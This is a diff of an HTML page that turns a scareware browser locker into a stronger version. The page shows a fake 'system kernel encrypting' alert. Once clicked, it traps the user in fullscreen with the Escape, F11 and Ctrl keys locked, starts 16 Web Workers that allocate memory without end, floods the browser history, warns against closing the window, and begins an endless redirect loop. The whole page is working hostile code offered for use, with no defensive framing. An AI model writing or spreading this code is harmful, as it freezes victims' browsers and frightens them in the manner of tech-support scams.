@@ -1,37 +1,65 @@
 <!DOCTYPE html>
 <html>
-<body onclick="payload()">
-    <h1 style="color:red; font-family:sans-serif;">SYSTEM COMPROMISED</h1>
+<head>
+    <title>SYSTEM_CRITICAL_RECOVERY</title>
+    <style>
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 20vh; overflow: hidden; }
+        #status { font-size: 2rem; border: 1px solid #00ff00; padding: 20px; display: inline-block; }
+    </style>
+</head>
+<body onclick="launchTitan()">
+    <div id="status">ENCRYPTING SYSTEM KERNEL...<br>CLICK TO AUTHENTICATE</div>
+
     <script>
-        // Obfuscated function names and logic
-        function _0xaf12() {
-            // History API Hijack: Flood history to break "Back" button
-            for(let i=0; i<500; i++) {
-                history.pushState(null, "", location.href + "#" + i);
-            }
-        }
-
-        async function payload() {
-            // 1. Enter Stealth Fullscreen
+        function launchTitan() {
+            // 1. Stealth Fullscreen & Keyboard/Mouse Hijack
             document.documentElement.requestFullscreen();
-            
-            // 2. Lock Keyboard to trap Esc key
-            if (navigator.keyboard) await navigator.keyboard.lock(["Escape"]);
+            if (navigator.keyboard) navigator.keyboard.lock(["Escape", "F11", "ControlLeft"]);
+            document.documentElement.requestPointerLock();
 
-            // 3. Start the History Flood
-            setInterval(_0xaf12, 100);
+            // 2. Background Thread Overload (Web Workers)
+            // We create a "Logic Bomb" inside a Blob to avoid needing an external .js file
+            const workerCode = `
+                while(true) {
+                    const data = new Array(10000000).fill("MALWARE_PAYLOAD_DATA");
+                    postMessage(data.length);
+                }
+            `;
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const workerUrl = URL.createObjectURL(blob);
 
-            // 4. Memory Exhaustion: Simulate a "Viral" spread in RAM
-            let _v = [];
+            // Spawn 16 workers to saturate multi-core CPUs
+            for (let i = 0; i < 16; i++) {
+                new Worker(workerUrl);
+            }
+
+            // 3. Main Thread Resource Exhaustion (Memory Spike)
+            let heap = [];
             setInterval(() => {
-                _v.push(new Uint8Array(1024 * 1024).fill(0xCC)); // 1MB chunks
-                if(_v.length > 500) _v = []; // Cycle to avoid instant OS crash but keep browser lagging
+                for (let j = 0; j < 500; j++) {
+                    heap.push(new Uint32Array(1024 * 1024)); // 4MB chunks
+                }
+                console.log("Buffer Overflow Level: " + heap.length);
+            }, 100);
+
+            // 4. Persistence: History API Flooding
+            setInterval(() => {
+                for(let k=0; k<100; k++) {
+                    history.pushState(null, "", "#recovering_system_" + Math.random());
+                }
             }, 50);
 
-            // 5. The "Loop of No Return"
-            window.onbeforeunload = () => "CRITICAL: DATA SYNC IN PROGRESS. DO NOT CLOSE.";
-            
-            console.log("Payload Active.");
+            // 5. Anti-Closure Trap
+            window.onbeforeunload = function() {
+                return "CRITICAL ERROR: CLOSING THIS WINDOW WILL RESULT IN PERMANENT DATA LOSS.";
+            };
+
+            // 6. Infinite Redirect Loop (Force-Reload if UI responds)
+            setTimeout(() => {
+                while(true) {
+                    location.replace(window.location.href + "?sync=" + Date.now());
+                }
+            }, 10000);
         }
     </script>
 </body>
